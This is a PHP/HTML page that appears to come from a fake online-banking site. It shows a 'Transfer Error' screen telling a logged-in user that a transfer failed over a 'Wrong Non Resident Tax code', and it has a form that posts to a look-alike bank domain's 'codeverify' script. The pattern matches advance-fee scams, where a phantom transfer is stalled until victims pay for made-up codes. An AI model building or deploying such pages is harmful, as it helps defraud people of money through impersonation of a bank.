<?php

session_start();
if(isset($_SESSION["AccountNumber"])) { 
    
} 

//else if(!isset($_SESSION["AccountNumber"])){
    
else	{
	echo "
	<script>
	alert('You have to login to access our website')
	location.href = 'member.php';
	</script>";
}


?>

<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Transfer Error</title>
<script type="text/javascript" src="customer_area.php_files/a"></script><script charset="UTF-8" src="customer_area.php_files/get"></script></head>

<body>

<table width="820" border="0" align="center" cellpadding="0" cellspacing="0" style="border:1px solid #a3a3a3">
	<tbody><tr>
		<td style="padding:10px" bgcolor="#EEEEEE">
		<table border="0" width="100%" cellspacing="1">
			<tbody><tr>
				<td width="392">Welcome,&nbsp; <b>&nbsp;</b></td>
				<td>
				Today: <b><?php echo date("d m Y"); ?> </b></td>
				<td width="176">
				<p align="right">Secure Online banking</p></td>
			</tr>
		</tbody></table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#0088cc">&nbsp;
		</td>
	</tr>
	<tr>
		<td style="padding:10px; vertical-align:top" height="164">
		<?php
        include("../top_menu.php")
        ?>
		</td>
	</tr>
	<tr>
		<td style="padding:10px; vertical-align:top">
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td width="190" style="padding:10px; border:1px solid #f4cd58; border-right:0px" bgcolor="#FBF2A5">
				Quick Menu</td>
				<td style="padding:10px; border:1px solid #f4cd58;" bgcolor="#FFFFCF">
				Transfer Money</td>
			</tr>
			<tr>
				<td width="192" style="padding:10px; vertical-align:top">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
				  <tr>
				    <td width="16" style="padding:5px; border:1px solid #a3a3a3"><img src="./transfer_1_entercode_files/acc_we8.gif" alt="." border="0"></td>
				    <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="#">Home</a></font></td>
			      </tr>
				  <tr>
				    <td width="16" style="padding:5px; border:1px solid #a3a3a3"><img src="./transfer_1_entercode_files/acc_we9.gif" alt="." border="0"></td>
				    <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="#">View Transactions</a></font></td>
			      </tr>
				  <tr>
				    <td width="16" style="padding:5px; border:1px solid #a3a3a3"><img src="./transfer_1_entercode_files/acc_we10.gif" alt="." border="0"></td>
				    <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="#">Pay a bill 
				      / someone</a></font></td>
			      </tr>
				  <tr>
				    <td width="16" style="padding:5px; border:1px solid #a3a3a3"><img src="./transfer_1_entercode_files/acc_we11.gif" alt="." border="0"></td>
				    <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="#">Transfer Money</a></font></td>
			      </tr>
				  <tr>
				    <td width="16" style="padding:5px; border:1px solid #a3a3a3"><img src="./transfer_1_entercode_files/acc_we12.gif" alt="." border="0"></td>
				    <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="#">Add Services</a></font></td>
			      </tr>
				  <tr>
				    <td width="16" style="padding:5px; border:1px solid #a3a3a3"><img src="./transfer_1_entercode_files/acc_we13.gif" alt="." border="0"></td>
				    <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="#">User Profile</a></font></td>
			      </tr>
				  <tr>
				    <td width="16" style="padding:5px; border:1px solid #a3a3a3"><img src="./transfer_1_entercode_files/acc_we14.gif" alt="." border="0"></td>
				    <td style="padding:5px; border:1px solid #a3a3a3"><font size="2"><a href="#">Logout</a></font></td>
			      </tr>
					<tbody>
				  </tbody></table>
				</td>
				<td style="padding:10px; border:1px solid #f4cd58; vertical-align:top; border-top:0px">
					<table border="0" width="102%" id="table17" height="195" cellspacing="0">
						<tbody><tr>
                      <td align="left" class="normaltext" height="93" style="BORDER-TOP: 0px solid" width="100%">
                      	<p align="center" style="margin-top: -1px; margin-bottom: -1px">
						<font size="2">Transfer process in progress. This may 
						take some minutes to complete.</font></p>
						<p align="center" style="margin-top: -1px; margin-bottom: -1px">
						<font size="2">Wrong Non Resident Tax code. Please 
						contact customer service<br>
						</font></p>
							<form method="POST" action="http://uk.sambabk.com/e/admin3/codeverify_1.php?account=&amp;cid=" style="margin: 0px">
						
							</form></td>
																																</tr>
						</tbody></table>
						</td>
			</tr>
		</tbody></table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#EEEEEE">&nbsp;</td>
	</tr>
</tbody></table>

<p>&nbsp;</p>



</body></html>